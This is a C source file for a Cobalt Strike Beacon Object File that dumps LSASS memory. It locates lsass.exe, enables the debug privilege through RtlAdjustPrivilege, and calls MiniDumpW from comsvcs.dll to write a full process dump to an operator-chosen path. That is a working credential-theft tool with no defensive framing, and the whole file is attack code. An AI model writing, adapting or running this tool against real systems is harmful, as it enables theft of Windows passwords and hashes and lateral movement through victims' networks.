#include <windows.h>

#include "Base.c"
#include "beacon.h"
#include "bofdefs.h"

#define TARGET_PROCESS "lsass.exe"

typedef HRESULT(WINAPI *_MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);

typedef NTSTATUS(WINAPI *_RtlAdjustPrivilege)(ULONG Privilege, BOOL Enable,
                                              BOOL CurrentThread,
                                              PULONG Enabled);

BOOL EnumProcess(IN char *pProcessName, OUT DWORD *pdwProcessId) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        if (stricmp(pe32.szExeFile, pProcessName) == 0) {
            *pdwProcessId = pe32.th32ProcessID;
            CloseHandle(hSnapshot);
            return TRUE;
        }
    } while (Process32Next(hSnapshot, &pe32));
}

void go(IN PCHAR argv, IN ULONG argc) {
    if (!bofstart()) return;

    datap Parser = {0};
    char *DumpPath = {0};
    int dwDumpPath = 0x00;
    WCHAR wCommandLine[MAX_PATH] = {0};
    WCHAR wDumpPath[MAX_PATH] = {0};
    DWORD Pid;
    HRESULT hr;
    ULONG t;
    _MiniDumpW MiniDumpW;
    _RtlAdjustPrivilege RtlAdjustPrivilege;

    BeaconDataParse(&Parser, argv, argc);
    DumpPath = BeaconDataExtract(&Parser, &dwDumpPath);

    if (PathFileExistsA(DumpPath)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] File already Exists !\n");
        return;
    }
    internal_printf("[+] DumpPath: %s\n", DumpPath);
    internal_printf("[*] Start Enum Process\n");

    if (!EnumProcess(TARGET_PROCESS, &Pid)) {
        BeaconPrintf(CALLBACK_ERROR, "[X] Can't Get Process Pid!\n");
        return;
    }
    internal_printf("[+] Target PID: %d\n", Pid);

    swprintf_s(wDumpPath, MAX_PATH, L"%hs", DumpPath);
    swprintf_s(wCommandLine, MAX_PATH, L"%d %ls full", Pid, wDumpPath);

    MiniDumpW =
        (_MiniDumpW)GetProcAddress(LoadLibrary("comsvcs.dll"), "MiniDumpW");
    RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(
        LoadLibrary("ntdll"), "RtlAdjustPrivilege");

    if (MiniDumpW == NULL || RtlAdjustPrivilege == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[X] Unable to resolve MiniDump!\n");
        return;
    }

    RtlAdjustPrivilege(20, TRUE, FALSE, &t);
    internal_printf("[+] Lanuch COMSVCS!MiniDumpW(\"%ls\")\n", wCommandLine);

    MiniDumpW(0, 0, wCommandLine);
    internal_printf("[+] Done!\n");

    memset(wDumpPath, 0, MAX_PATH);
    memset(wCommandLine, 0, MAX_PATH);

    printoutput(TRUE);
    return;
}
